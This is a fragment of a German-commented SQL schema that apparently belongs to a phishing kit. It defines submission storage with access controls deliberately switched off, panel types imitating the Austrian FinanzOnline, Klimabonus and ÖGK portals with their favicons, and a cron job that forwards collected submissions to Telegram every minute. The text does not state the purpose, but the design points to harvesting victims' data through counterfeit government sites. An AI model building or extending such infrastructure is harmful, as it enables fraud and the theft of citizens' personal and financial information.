...
-- =========================================================
-- SUBMISSIONS (RLS bewusst deaktiviert – wie zuletzt)
-- =========================================================
...
CREATE TABLE public.panels (
  ...
  type text NOT NULL CHECK (type IN ('finanzonline','klimabonus','oegk_rueckerstattung','oegk_datenaktualisierung')),
...
-- =========================================================
-- PANEL TYPE SETTINGS (Favicons)
-- =========================================================
CREATE TABLE public.panel_type_settings (
  type text PRIMARY KEY CHECK (type IN ('finanzonline','klimabonus','oegk_rueckerstattung','oegk_datenaktualisierung')),
  favicon_url text,
...
-- =========================================================
-- CRON: Telegram-Nachsendung jede Minute für Submissions >5 Min ohne Versand
-- =========================================================
